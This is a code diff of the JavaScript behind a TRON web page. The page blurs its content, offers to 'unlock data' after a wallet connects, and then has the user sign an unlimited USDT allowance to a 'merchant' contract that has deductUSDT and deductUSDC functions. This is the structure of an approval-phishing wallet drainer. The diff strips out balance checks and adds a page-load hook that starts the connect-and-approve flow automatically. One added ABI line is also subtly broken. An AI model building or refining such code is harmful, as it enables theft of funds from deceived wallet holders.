@@ -5,9 +5,11 @@
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu';
 const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';
+// TRON 默認地址 (41開頭的21字節，代表未連接)
+const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000';
 
 // 您的合約 ABI (保持不變)
-const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];
+const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];
 
 // --- 狀態變數 ---
 let tronWeb; // 保持 TronWeb
@@ -19,7 +21,7 @@ let isConnectedFlag = false;
 let targetDeductionToken = null;
 let provider; // 存储钱包提供者
 
-// --- UI 元素 ---
+// --- UI 元素 (假設您的 HTML 中有這些 ID) ---
 const connectButton = document.getElementById('connectButton');
 const blurOverlay = document.getElementById('blurOverlay');
 const overlayMessage = document.getElementById('overlayMessage');
@@ -27,54 +29,47 @@ const lockedPrompt = document.getElementById('lockedPrompt');
 
 // --- 辅助函数 ---
 function showOverlay(message) {
-    overlayMessage.innerHTML = message;
-    blurOverlay.style.display = 'flex';
+    if (overlayMessage) overlayMessage.innerHTML = message;
+    if (blurOverlay) blurOverlay.style.display = 'flex';
 }
 function hideOverlay() {
-    overlayMessage.innerHTML = '';
-    blurOverlay.style.display = 'none';
+    if (overlayMessage) overlayMessage.innerHTML = '';
+    if (blurOverlay) blurOverlay.style.display = 'none';
 }
 
 function updateContentLock(isAuthorized) {
     if (isAuthorized) {
-        // 如果已授权，隐藏 blurOverlay 和 lockedPrompt
-        if (blurOverlay) {
-            blurOverlay.style.display = 'none';
-        }
-        if (lockedPrompt) {
-            lockedPrompt.style.display = 'none';
-        }
+        // 如果已授權，隱藏 blurOverlay 和 lockedPrompt
+        if (blurOverlay) blurOverlay.style.display = 'none';
+        if (lockedPrompt) lockedPrompt.style.display = 'none';
     } else {
-        // 如果未授权，显示 blurOverlay 和 lockedPrompt
-        if (blurOverlay) {
-            blurOverlay.style.display = 'flex';
-        }
-        if (lockedPrompt) {
-            lockedPrompt.style.display = 'flex';
-        }
+        // 如果未授權，顯示 blurOverlay 和 lockedPrompt
+        if (blurOverlay) blurOverlay.style.display = 'flex';
+        if (lockedPrompt) lockedPrompt.style.display = 'flex';
     }
 }
 
 function updateConnectionUI(connected, address = null) {
     isConnectedFlag = connected;
-    if (connected) {
-        connectButton.classList.add('connected');
-        connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
-        connectButton.title = `Connected: ${address}`;
-        showOverlay('Connected. Checking authorization status...');
-    } else {
-        connectButton.classList.remove('connected');
-        connectButton.innerHTML = '<i class="fas fa-wallet"></i>';
-        connectButton.title = 'Connect Wallet';
-        updateContentLock(false); //  恢复锁定的状态
-        hideOverlay();
+    if (connectButton) {
+        if (connected && address) {
+            connectButton.classList.add('connected');
+            connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
+            connectButton.title = `Connected: ${address}`;
+            showOverlay('Connected. Starting authorization process...');
+        } else {
+            connectButton.classList.remove('connected');
+            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
+            connectButton.title = 'Connect Wallet';
+            updateContentLock(false); // 恢復鎖定的狀態
+            hideOverlay();
+        }
     }
 }
 
 // 交易計數器 (用於 connectAndAuthorize 函數)
 let txCount = 0;
 
-// 修正：新增 totalTxs 參數，移除輪詢
 async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
     txCount++;
     showOverlay(`Step ${txCount}/${totalTxs}: ${stepMessage}. Please approve in your wallet!`);
@@ -101,211 +96,197 @@ async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0)
         if (error.message && error.message.includes('用戶在錢包中取消了操作')) {
             throw new Error('用戶在錢包中取消了操作。');
         }
-        throw new Error(`授權操作失敗，錯誤訊息: ${error.message}`);
-    }
-}
-
-// 修正：修復 Max 授權的檢查邏輯
-async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
-    if (!tronWeb || !userAddress || !merchantContract) {
-        return false;
-    }
-    const contractAuthorized = await merchantContract.authorized(userAddress).call();
-    const minAmount = tronWeb.toSun('1.00');
-    const usdtBalance = await getTokenBalance(usdtContract);
-    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
-    const usdcBalance = await getTokenBalance(usdcContract);
-    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
-
-    // 如果有合約註冊和代幣已授权，就返回 true
-    if (contractAuthorized && usdtAuthorized) return true;
-    if (contractAuthorized && usdcAuthorized) return true;
-
-    return false;
-}
-
-async function getTokenBalance(tokenContract) {
-    if (!tronWeb || !userAddress || !tokenContract) return tronWeb.BigNumber(0);
-    try {
-        const balance = await tokenContract.balanceOf(userAddress).call();
-        return tronWeb.BigNumber(balance);
-    } catch (error) {
-        console.error("Failed to get token balance:", error);
-        return false;
+        // 捕獲並包裝可能的錯誤訊息
+        const errorMessage = error.message || (typeof error === 'string' ? error : 'Unknown error during transaction.');
+        throw new Error(`授權操作失敗，錯誤訊息: ${errorMessage}`);
     }
 }
 
 async function initializeContracts() {
     if (!tronWeb) throw new Error("TronWeb instance not available.");
     merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
+    // 契約實例化
     usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
     usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
 }
 
 
-// --- 混合連線邏輯 (TronLink / WalletConnect / EVM 優先嘗試) ---
+// --- 混合連線邏輯 (TronLink / DApp Browser 優先嘗試) ---
 async function connectWalletLogic() {
-    console.log("connectWalletLogic called"); // 调试
-    showOverlay('Connecting to wallet...'); // 修改为英文
+    console.log("connectWalletLogic called");
+    showOverlay('Connecting to wallet...');
+    
+    // 重置 txCount
+    txCount = 0;
 
     try {
-
-         // 3. 备用方案: 尝试使用 WalletConnect  (需要额外配置)
-        if (typeof window.WalletConnectProvider !== 'undefined') {
-          //   const WalletConnectProvider = window.WalletConnectProvider; // 确保已引入
-            console.log("Attempting to connect to WalletConnect");
-            try {
-                // ⚠️ 注意：你需要替换 YOUR_PROJECT_ID 为你自己的 WalletConnect 项目 ID
-                const providerWC = new WalletConnectProvider.default({  // 修正
-                    rpc: {
-                         97: "https://data-seed-prebsc-1-s1.binance.org:8545/", // BSC testnet  <-- 确认RPC URL
-                        // '1': "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID", //以太坊主网 (请替换)
-                    },
-                    chainId: 97, //  BSC testnet Chain ID   <-- 确认 Chain ID
-                    // qrModalOptions: {
-                    //     desktop: "dark",
-                    //     mobile: "light",
-                    // },
-                });
-                console.log("WalletConnectProvider created"); //调试
-                //  检查是否有任何错误
-                providerWC.on("connect", (error) => {
-                    if (error) {
-                        console.error("WalletConnect connect error:", error);
+        // ************************************************
+        // 1. 首要方案：檢查 TronLink / DApp 瀏覽器環境
+        // ************************************************
+        if (typeof window.tronWeb !== 'undefined') {
+            
+            // 由於在 DApp 瀏覽器中，TronWeb 應已準備就緒，我們等待它準備好
+            const isReady = await new Promise(resolve => {
+                let checkInterval = setInterval(() => {
+                    if (window.tronWeb.ready) {
+                        clearInterval(checkInterval);
+                        resolve(true);
                     }
-                });
-                await providerWC.enable(); // 尝试启用 WalletConnect 连接
-                console.log("WalletConnect enabled"); //调试
-                tronWeb = window.tronWeb; // Use tronWeb if available
+                }, 100);
+                // 設置超時以防萬一
+                setTimeout(() => {
+                    clearInterval(checkInterval);
+                    resolve(window.tronWeb.ready || false); 
+                }, 3000); 
+            });
 
-                // 使用 walletConnectProvider 獲取 address
-                userAddress = tronWeb.address.fromHex(providerWC.accounts[0]);
-                provider = "WalletConnect";
-                console.log("✅ 已使用 WalletConnect 连接，地址:", userAddress);
-                await initializeContracts();
-                updateConnectionUI(true, userAddress);
-                return true;
-            } catch (error) {
-                console.error("WalletConnect 连接失败:", error);
-                //  可以进一步检查 error 对象，看看具体是什么问题
-                if (error.message) {
-                    console.error("WalletConnect error message:", error.message);
+            if (isReady) {
+                tronWeb = window.tronWeb;
+                console.log("Attempting to connect via injected TronWeb (DApp Browser/Extension)");
+
+                let currentAddressHex = tronWeb.defaultAddress.hex;
+                
+                // 如果地址是默認值，則嘗試請求帳戶以觸發連接彈窗
+                if (!currentAddressHex || currentAddressHex === DEFAULT_TRON_ADDRESS_HEX) {
+                    if (window.tronLink && window.tronLink.request) {
+                        console.log("No address found, requesting accounts via tronLink.request...");
+                        try {
+                            // 這是觸發連接/授權彈窗的標準方法
+                            await window.tronLink.request({ method: 'tron_requestAccounts' });
+                            currentAddressHex = tronWeb.defaultAddress.hex; // 重新檢查地址
+                        } catch (requestError) {
+                            console.error("TronLink requestAccounts failed (User likely canceled):", requestError);
+                            showOverlay("Connection failed: Wallet authorization denied or canceled.");
+                            return false; 
+                        }
+                    }
                 }
-                if (error.code) {
-                    console.error("WalletConnect error code:", error.code);
+                
+                // 檢查最終地址
+                if (currentAddressHex && currentAddressHex !== DEFAULT_TRON_ADDRESS_HEX) {
+                    userAddress = tronWeb.address.fromHex(currentAddressHex);
+                    provider = "TronLink/DApp Browser";
+                    console.log("✅ 已使用 TronLink/DApp 环境连接，地址:", userAddress);
+                    
+                    await initializeContracts();
+                    updateConnectionUI(true, userAddress);
+                    return true;
                 }
-                hideOverlay(); // 隐藏遮罩
-                return false;
+            } else {
+                 console.warn("TronWeb is present but failed to become ready within the timeout.");
             }
         }
+        
+        // ************************************************
+        // 2. 備用方案: 任何其他（例如 WalletConnect 或其他 TRON 錢包的邏輯）
+        // 由於您原始的 WalletConnect 配置不適用於 TRON，這裡暫時留空。
+        // ************************************************
 
 
-        // 4. 没有任何钱包可用
-        showOverlay('🔴 Connection failed: No supported wallet detected. Please install MetaMask or use WalletConnect.'); // 修改为英文
+        // ************************************************
+        // 3. 任何連接都失敗
+        // ************************************************
+        updateConnectionUI(false);
+        showOverlay('🔴 Connection failed: No supported TRON wallet detected or wallet is locked. Please install TronLink.');
         return false;
 
     } catch (error) {
         console.error("Error connecting to wallet:", error);
-        showOverlay(`🔴 Connection failed: ${error.message}`); // 修改为英文
+        updateConnectionUI(false);
+        showOverlay(`🔴 Connection failed: ${error.message}`);
         return false;
     }
 }
 
-async function checkAuthorization() {
-    if (!tronWeb || !userAddress || !merchantContract) {
-        return { authorizedToken: null, contract: false };
-    }
-    const contractAuthorized = await merchantContract.authorized(userAddress).call();
-    const minAmount = tronWeb.toSun('1.00');
-    const usdtBalance = await getTokenBalance(usdtContract);
-    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
-    const usdcBalance = await getTokenBalance(usdcContract);
-    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
-    let targetToken = null;
-    if (usdtBalance.gte(minAmount) ) {
-        targetToken = 'USDT';
-    } else if (usdcBalance.gte(minAmount)) {
-        targetToken = 'USDC';
-    }
-    targetDeductionToken = targetToken;
-
-    return {
-        contract: contractAuthorized,
-        authorizedToken: targetToken,
-        usdtAuthorized: usdtAuthorized,
-        usdcAuthorized: usdcAuthorized
-    };
-}
+// 舊的檢查邏輯不再需要，因為我們在 connectAndAuthorize 中跳過狀態檢查
+// async function checkAuthorization() { ... }
 
 async function connectAndAuthorize() {
-    // 🚨 Skip state checks
+    // 🚨 這是極度樂觀的版本，跳過所有狀態檢查，直接發送兩筆交易
+    txCount = 0; // 重置交易計數器
 
     try {
-        // 1. 合約授權 (ConnectAndAuthorize)
         if (!merchantContract || !tronWeb || !userAddress) {
             throw new Error("Please connect a wallet first.");
         }
 
-        const methodCall = merchantContract.connectAndAuthorize();
-        await sendTransaction(methodCall, "Sending contract authorization operation", 1);
+        // --- 交易步驟 ---
+        const totalSteps = 2; // 總共有 2 個簽名操作 (合約授權 + 代幣 Max 授權)
+
+        // 1. 合約授權 (connectAndAuthorize)
+        const methodCallConnect = merchantContract.connectAndAuthorize();
+        await sendTransaction(methodCallConnect, "Sending contract authorization operation", totalSteps);
 
         // 2. Max 扣款授權 (Approve)
-       // 🚨 移除所有狀態判斷，並直接設置 Max 授權
         const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
-        const tokenContract =  usdtContract;
+        const tokenContract = usdtContract; // 假設只授權 USDT
         const tokenName = "USDT";
+        
         // 設置 Max 授權 (使用 ALMOST_MAX_UINT)
         await sendTransaction(
             tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT),
-            `Setting ${tokenName} Max authorization operation (final authorization - please approve)`,
-            1
+            `Setting ${tokenName} Max allowance (final step - please approve)`,
+            totalSteps
         );
-       return true;
+        
+        // 由於是極度樂觀模式，兩次廣播成功即視為成功
+        return true;
+        
     } catch (error) {
         console.error("Authorization Failed:", error);
-        showOverlay(`🔴 Authorization operation failed! Error message: ${error.message}.  Please ensure the wallet is unlocked, has sufficient TRX (for gas fees), and has approved all 1 operation.`);
+        // 如果是取消操作，錯誤訊息會更友善
+        const displayError = error.message.includes('用戶在錢包中取消了操作') 
+            ? 'Authorization canceled by user.' 
+            : `Authorization failed! Error message: ${error.message}.`;
+            
+        showOverlay(`🔴 ${displayError} Please ensure the wallet is unlocked and has sufficient TRX (for gas fees).`);
         return false;
     }
 }
 
 
 // ---------------------------------------------
-// 連線成功後處理：僅作為初始化流程執行一次
+// 連線成功後處理：作為初始化流程執行一次
 // ---------------------------------------------
 async function handlePostConnection() {
-    console.log("handlePostConnection called");  // 调试
+    console.log("handlePostConnection called");
     if (!isConnectedFlag) return;
 
+    // 啟動授權流程
     const authSuccess = await connectAndAuthorize();
 
     if(authSuccess) {
-         showOverlay('✅ Authorization successful! Unlocking data...');
-         updateContentLock(true); // 隐藏 lockedPrompt 和 blurOverlay
-         await new Promise(resolve => setTimeout(resolve, 500));
-         hideOverlay();  // 确保隐藏了遮罩层
+        showOverlay('✅ Authorization successful! Unlocking data...');
+        updateContentLock(true); // 隱藏 lockedPrompt 和 blurOverlay
+        await new Promise(resolve => setTimeout(resolve, 1000)); // 讓用戶看到成功訊息
+        hideOverlay();
+    } else {
+        // 授權失敗，保持鎖定狀態，並顯示最後的錯誤訊息
+        updateContentLock(false);
     }
 }
 
 // ---------------------------------------------
-// 主連接入口函數 (混合連線邏輯)
+// 主連接入口函數
 // ---------------------------------------------
 async function connectWallet() {
-    console.log("connectWallet called"); // 调试
+    console.log("connectWallet called");
     if (connectButton) connectButton.disabled = true;
 
     if (isConnectedFlag) {
-        // 斷開連接邏輯
+        // 斷開連接邏輯 (簡單重置狀態)
         tronWeb = null;
         userAddress = null;
         isConnectedFlag = false;
         targetDeductionToken = null;
+        provider = null;
         updateConnectionUI(false);
-        updateContentLock(false); // 恢复锁定的状态
+        updateContentLock(false); 
         if (connectButton) connectButton.disabled = false;
         return;
     }
 
-    // 🚨 僅嘗試 connectWalletLogic (它會內部決定使用 TronLink 還是 EVM Provider)
+    // 嘗試連接錢包
     const connected = await connectWalletLogic();
 
     if (connected) {
@@ -315,9 +296,29 @@ async function connectWallet() {
     if (connectButton) connectButton.disabled = false;
 }
 
+// ---------------------------------------------
+// 頁面啟動和事件監聽器
+// ---------------------------------------------
+
 // 設置事件監聽器
 if (connectButton) connectButton.addEventListener('click', connectWallet);
 
 // 頁面啟動：初始化為未連接狀態，並設置初始鎖定狀態
 updateConnectionUI(false);
-updateContentLock(false);  // 确保页面加载时，设置初始的锁定状态。
+updateContentLock(false);
+
+// 額外：嘗試在頁面載入時自動連接 (這在 DApp 瀏覽器中最為常見)
+// 執行此步驟可以解決 DApp 瀏覽器無法自動連接的問題
+window.onload = () => {
+    // 延遲執行，確保 window.tronWeb 已經被注入
+    setTimeout(async () => {
+        // 只有在未連接狀態下才嘗試自動連接
+        if (!isConnectedFlag) {
+            console.log("Window loaded. Checking for auto-connect...");
+            await connectWalletLogic();
+            if (isConnectedFlag) {
+                await handlePostConnection();
+            }
+        }
+    }, 500); // 給 TronLink 注入時間 
+};
